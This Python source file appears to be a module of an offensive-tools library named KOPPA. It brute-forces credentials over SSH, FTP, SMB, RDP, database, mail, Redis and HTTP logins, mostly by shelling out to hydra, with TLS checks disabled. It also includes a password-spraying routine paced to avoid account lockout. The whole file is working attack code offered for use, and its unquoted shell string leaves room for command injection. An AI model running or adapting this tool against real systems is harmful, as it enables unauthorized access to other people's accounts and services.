"""KOPPA stdlib: brute — multi-protocol credential brute-forcing."""
import subprocess, re, threading, urllib.request, urllib.parse, json, time, tempfile, os, ssl

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode    = ssl.CERT_NONE


class Cred:
    def __init__(self, user, password, proto=""):
        self.user     = user
        self.password = password
        self.found    = True
        self.proto    = proto

    def __repr__(self):
        return f"<Cred {self.user}:{self.password}>"


def _hydra(target_url, users, passwords, threads=16):
    uf = tempfile.NamedTemporaryFile(mode="w", suffix=".u", delete=False)
    pf = tempfile.NamedTemporaryFile(mode="w", suffix=".p", delete=False)
    uf.write("\n".join(users)); uf.close()
    pf.write("\n".join(passwords)); pf.close()
    out = subprocess.getoutput(
        f"hydra -L {uf.name} -P {pf.name} -t {threads} -q {target_url} 2>/dev/null"
    )
    os.unlink(uf.name); os.unlink(pf.name)
    creds = []
    for line in out.splitlines():
        m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
        if m:
            creds.append(Cred(m.group(1), m.group(2)))
    return creds[0] if creds else None


def ssh(host, users, passwords, port=22):
    return _hydra(f"ssh://{host}:{port}", users, passwords)

def ftp(host, users, passwords, port=21):
    return _hydra(f"ftp://{host}:{port}", users, passwords)

def smb(host, users, passwords):
    return _hydra(f"smb://{host}", users, passwords)

def rdp(host, users, passwords, port=3389):
    return _hydra(f"rdp://{host}:{port}", users, passwords, threads=4)

def mysql(host, users, passwords, port=3306):
    return _hydra(f"mysql://{host}:{port}", users, passwords)

def postgres(host, users, passwords, port=5432):
    return _hydra(f"postgres://{host}:{port}", users, passwords)

def mssql(host, users, passwords, port=1433):
    return _hydra(f"mssql://{host}:{port}", users, passwords)

def telnet(host, users, passwords, port=23):
    return _hydra(f"telnet://{host}:{port}", users, passwords)

def pop3(host, users, passwords, port=110):
    return _hydra(f"pop3://{host}:{port}", users, passwords)

def imap(host, users, passwords, port=143):
    return _hydra(f"imap://{host}:{port}", users, passwords)

def redis(host, passwords, port=6379):
    """Brute-force Redis with password list."""
    import socket
    for pw in passwords:
        try:
            s = socket.create_connection((host, port), timeout=5)
            s.sendall(f"AUTH {pw}\r\n".encode())
            r = s.recv(64).decode()
            s.close()
            if "+OK" in r:
                return Cred("", pw, "redis")
        except Exception:
            pass
    return None

def http_basic(url, users, passwords):
    """HTTP Basic Auth brute force (pure Python, no hydra)."""
    import base64
    for user in users:
        for pw in passwords:
            token = base64.b64encode(f"{user}:{pw}".encode()).decode()
            req = urllib.request.Request(url, headers={"Authorization": f"Basic {token}"})
            try:
                with urllib.request.urlopen(req, timeout=10, context=_ctx) as r:
                    if r.status == 200:
                        return Cred(user, pw, "http-basic")
            except urllib.error.HTTPError as e:
                if e.code not in (401, 403):
                    return Cred(user, pw, "http-basic")
            except Exception:
                pass
    return None

def http_form(url, user_field, pass_field, users, passwords,
              fail_str="Invalid", method="POST"):
    """HTTP form brute force."""
    for user in users:
        for pw in passwords:
            data = urllib.parse.urlencode({user_field: user, pass_field: pw}).encode()
            req  = urllib.request.Request(url, data=data, method=method)
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            try:
                with urllib.request.urlopen(req, timeout=10, context=_ctx) as r:
                    body = r.read().decode(errors="replace")
                    if fail_str not in body:
                        return Cred(user, pw, "http-form")
            except Exception as e:
                if "302" in str(e) or "200" in str(e):
                    return Cred(user, pw, "http-form")
    return None

def spray(hosts, protocol, users, passwords, delay_ms=500):
    """Password spray across multiple hosts with delay to avoid lockout."""
    results = []
    fn_map = {"ssh": ssh, "ftp": ftp, "smb": smb, "rdp": rdp}
    fn = fn_map.get(protocol)
    if not fn:
        return results
    for pw in passwords:
        for host in hosts:
            r = fn(host, users, [pw])
            if r:
                results.append(r)
        time.sleep(delay_ms / 1000.0)
    return results
